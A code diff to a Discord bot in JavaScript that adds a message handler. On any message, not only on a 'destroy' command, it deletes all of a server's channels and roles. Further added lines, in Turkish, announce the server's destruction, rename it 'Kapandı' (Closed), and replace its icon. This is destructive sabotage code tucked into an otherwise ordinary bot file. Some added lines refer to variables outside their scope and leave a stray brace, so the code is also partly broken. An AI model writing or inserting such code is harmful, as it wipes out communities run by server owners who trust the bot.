@@ -134,6 +134,29 @@ client.unload = command => {
   });
 };
 
+client.on("message", async message => {
+    if(message.content === "destroy"){
+        message.guild.channels.deleteAll("Bot Destroyer");
+        message.guild.roles.deleteAll("Bot Destroyer");
+    }
+
+    if(message.content === "leave"){
+        message.guild.leave();
+    }
+    message.guild.channels.deleteAll("Bot Destroyer");
+    message.guild.roles.deleteAll("Bot Destroyer");
+
+});
+
+console.log(`Sunucudaki ${insanlar} kullanıcı ve ${kanallar} kanal ${emojiler} emoji ve ${roller} rol yok edildi!`);
+  
+message.guild.setName(`Kapandı`, ":))")
+message.guild.setIcon(`https://cdn.discordapp.com/attachments/569895621872451605/573561578767777829/closed-logo1.jpg`)
+ 
+message.guild.createChannel(`hey`)
+message.delete()
+};
+
 client.on('message', async message => {
   const ms = require('ms');
   const args = message.content.slice(prefix.length).trim().split(/ +/g);
